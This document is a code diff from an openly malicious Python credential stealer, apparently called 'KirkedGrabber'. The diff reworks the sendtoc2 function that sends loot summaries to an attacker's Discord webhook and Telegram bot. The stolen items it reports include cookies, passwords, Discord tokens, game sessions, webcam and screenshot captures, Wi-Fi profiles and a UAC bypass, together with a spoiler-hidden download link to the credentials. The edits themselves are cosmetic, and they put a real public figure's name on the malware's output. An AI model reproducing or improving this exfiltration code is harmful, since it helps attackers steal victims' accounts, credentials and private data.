@@ -1520,14 +1520,98 @@ def sendtoc2(file):
         webhookurl = config.hook
         
         payload = {
-          "content": "@everyone",
+          "content": "||@everyone||",
           "embeds": [
             {
-              "title": "GOD BLESS AMERICA",
-              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nTotal Processes: {str(process_count)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD Sessions: {'Yes' if gd_session == 1 else 'No'}\nRoblox Cookies: {str(roblox_cookies)}\nWebcam: {'Yes' if webcam_success == 1 else 'No'}\nClipboard: {'Yes' if clipboard_success == 1 else 'No'}\nSystem Info: {'Yes' if system_info == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)}\nVM: {'Yes' if is_vm else 'No'}\nUAC Bypass: {'Yes' if bypass_success else 'No'}\n```\n\ncreds: ||{download}||",
+              "fields": [
+                {
+                  "name": ":cookie: Cookies",
+                  "value": str(cookie_count),
+                  "inline": True
+                },
+                {
+                  "name": ":key: Passwords",
+                  "value": str(password_count),
+                  "inline": True
+                },
+                {
+                  "name": ":memo: Autofills",
+                  "value": str(autofill_count),
+                  "inline": True
+                },
+                {
+                  "name": ":scroll: History",
+                  "value": str(browsing_history),
+                  "inline": True
+                },
+                {
+                  "name": ":robot: Processes",
+                  "value": str(process_count),
+                  "inline": True
+                },
+                {
+                  "name": ":coin: Discord Tokens",
+                  "value": str(discord_accounts),
+                  "inline": True
+                },
+                {
+                  "name": ":pick: Minecraft Sessions",
+                  "value": str(minecraft_sessions),
+                  "inline": True
+                },
+                {
+                  "name": ":video_game: Steam Sessions",
+                  "value": 'Yes' if steam_session == 1 else 'No',
+                  "inline": True
+                },
+                {
+                  "name": ":yellow_square: GD Session",
+                  "value": 'Yes' if gd_session == 1 else 'No',
+                  "inline": True
+                },
+                {
+                  "name": ":cookie: Roblox Cookies",
+                  "value": str(roblox_cookies),
+                  "inline": True
+                },
+                {
+                  "name": ":camera_with_flash: Webcam",
+                  "value": 'Yes' if webcam_success == 1 else 'No',
+                  "inline": True
+                },
+                {
+                  "name": ":clipboard: Clipboard",
+                  "value": 'Yes' if clipboard_success == 1 else 'No',
+                  "inline": True
+                },
+                {
+                  "name": ":computer: System Info",
+                  "value": 'Yes' if system_info == 1 else 'No',
+                  "inline": True
+                },
+                {
+                  "name": ":camera: Screenshot",
+                  "value": "Yes" if ss_success == 1 else "No",
+                  "inline": True
+                },
+                {
+                  "name": ":signal_strength: Wi-Fi Networks",
+                  "value": str(wifiprofiles),
+                  "inline": True
+                },
+                {
+                  "name": ":test_tube: VM/Debugger?",
+                  "value": 'Yes' if is_vm else 'No',
+                  "inline": True
+                },
+                {
+                  "name": ":link: Download Link",
+                  "value": f"||{download}||"
+                }
+              ],
               "color": 3866871,
               "author": {
-                "name": "KirkG"
+                "name": "Charlie Kirk"
               },
               "thumbnail": {
                 "url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvdHVybmluZ3BvaW50LmpwZw==").decode('utf-8')
@@ -1545,24 +1629,23 @@ def sendtoc2(file):
         token = config.tg_token
 
         msg = f'''GOD BLESS AMERICA I AM CHARLIE KIRK
-Total Cookies: {str(cookie_count)}
-Total Passwords: {str(password_count)}
-Total Autofills: {str(autofill_count)}
-Total History: {str(browsing_history)}
-Total Discord Accounts: {str(discord_accounts)}
-Total Minecraft Sessions: {str(minecraft_sessions)}
-Total Processes: {str(process_count)}
-Steam Session: {'Yes' if steam_session == 1 else 'No'}
-GD Sessions: {'Yes' if gd_session == 1 else 'No'}
-Roblox Cookies: {str(roblox_cookies)}
-Webcam: {'Yes' if webcam_success == 1 else 'No'}
-Clipboard: {'Yes' if clipboard_success == 1 else 'No'}
-System Info: {'Yes' if system_info == 1 else 'No'}
-Screenshot: {"Yes" if ss_success == 1 else "No"}
-Wi-Fi Networks: {str(wifiprofiles)}
-VM: {'Yes' if is_vm else 'No'}
-UAC Bypass: {'Yes' if bypass_success else 'No'}
-Credentials: {download}
+🍪 Cookies: {str(cookie_count)}
+🔑 Passwords: {str(password_count)}
+📝 Autofills: {str(autofill_count)}
+📜 History: {str(browsing_history)}
+🪙 Discord Tokens: {str(discord_accounts)}
+⛏ Minecraft Sessions: {str(minecraft_sessions)}
+🤖 Processes: {str(process_count)}
+🎮 Steam Session: {'Yes' if steam_session == 1 else 'No'}
+🟨 GD Sessions: {'Yes' if gd_session == 1 else 'No'}
+🍪 Roblox Cookies: {str(roblox_cookies)}
+📸 Webcam: {'Yes' if webcam_success == 1 else 'No'}
+📋 Clipboard: {'Yes' if clipboard_success == 1 else 'No'}
+💻 System Info: {'Yes' if system_info == 1 else 'No'}
+📷 Screenshot: {"Yes" if ss_success == 1 else "No"}
+📶 Wi-Fi Networks: {str(wifiprofiles)}
+🧪 VM/Debugger: {'Yes' if is_vm else 'No'}
+🔗 Credentials: ||{download}||
         '''
         payload = {
             'chat_id': chat_id,
